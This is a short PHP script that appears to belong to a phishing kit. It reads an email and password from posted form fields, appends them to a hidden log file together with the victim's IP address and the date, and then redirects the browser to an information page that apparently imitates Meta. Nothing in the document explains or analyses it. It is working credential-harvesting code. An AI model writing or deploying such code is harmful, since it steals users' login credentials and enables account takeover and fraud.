<?php
$file = "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx";
$uid = $_POST['PrevToEmail'];
$upas = $_POST['PrevToPass'];
$semua = $_SERVER['REMOTE_ADDR'];
$today = date("F j, Y, g:i a");

$handle = fopen($file, 'a');
fwrite($handle, "\n");
fwrite($handle, "*************************************************************|FILES-2|");
fwrite($handle, "\n");
fwrite($handle, "User ID         : ");
fwrite($handle, "$uid");
fwrite($handle, "\n");
fwrite($handle, "User Pass       : ");
fwrite($handle, "$upas");
fwrite($handle, "\n");
fwrite($handle, "IP Address      : ");
fwrite($handle, "$semua");
fwrite($handle, "\n");
fwrite($handle, "Date of entry   : ");
fwrite($handle, "$today");
fwrite($handle, "\n");
fwrite($handle, "*************************************************************|FILES-2|");
fclose($handle);
echo "<script LANGUAGE=\"JavaScript\">
<!--
window.location=\"information.php?section_id=13-HowToContactMeta\";
// -->
</script>";
?>